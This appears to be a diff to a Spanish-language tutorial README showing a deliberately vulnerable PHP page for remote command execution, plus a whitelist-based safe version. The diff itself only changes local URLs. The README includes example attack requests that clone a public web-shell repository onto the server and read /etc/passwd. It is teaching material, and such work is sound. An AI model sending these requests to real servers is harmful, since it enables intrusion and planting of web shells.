@@ -3,7 +3,7 @@
 Una vulnerabilidad RCE consiste en ejecutar comandos de forma remota en el servidor para acceder a él o para instalar malware en el servidor.
 
 ### Vulnerable Website
-http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_vulnerable.php
+http://localhost:8080/RCE/rce_vulnerable.php
 
 En este sitio puedes enviar un comando y el servidor lo ejecutara, puedes probar con el comando ls.
 ```
@@ -19,25 +19,25 @@ echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
 ?>
 ```
 
-http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_vulnerable.php?cmd=ls
+http://localhost:8080/RCE/rce_vulnerable.php?cmd=ls
 
 ![alt text](./images/ls_example.png)
 
 Ejecutando un comando git clone podrias instalar un repositorio de Github en el servidor.
 
-http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_vulnerable.php?cmd=git%20clone%20https://github.com/xl7dev/WebShell.git
+http://localhost:8080/RCE/rce_vulnerable.php?cmd=git%20clone%20https://github.com/xl7dev/WebShell.git
 
 *Es posible que necesite modificar los permisos de la carpeta para hacer esto*
 
 Tambien podrias tratar de obtener el fichero etc/passwd.
 
-http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_vulnerable.php?cmd=cat%20/etc/passwd
+http://localhost:8080/RCE/rce_vulnerable.php?cmd=cat%20/etc/passwd
 
 ![alt text](./images/passwd_example.png)
 
 ### Sitio web seguro.
 
-http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_safe.php
+http://localhost:8080/RCE/rce_safe.php
 
 Aunque lo ideal sería no permitir al sitio web ejecutar comandos ai necesitamos la ejecución de determinados comandos podemos crear una lista blanca de los comandos que vamos a jeecutar.
 
@@ -60,6 +60,6 @@ echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
 ```
 Si ejecutamos un comando no permitido se detendra la ejecución antes de ejecutarlo.
 
-http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_safe.php?cmd=cat%20/etc/passwd
+http://localhost:8080/RCE/rce_safe.php?cmd=cat%20/etc/passwd
 
 ![alt text](./images/fail_passwd_example.png)
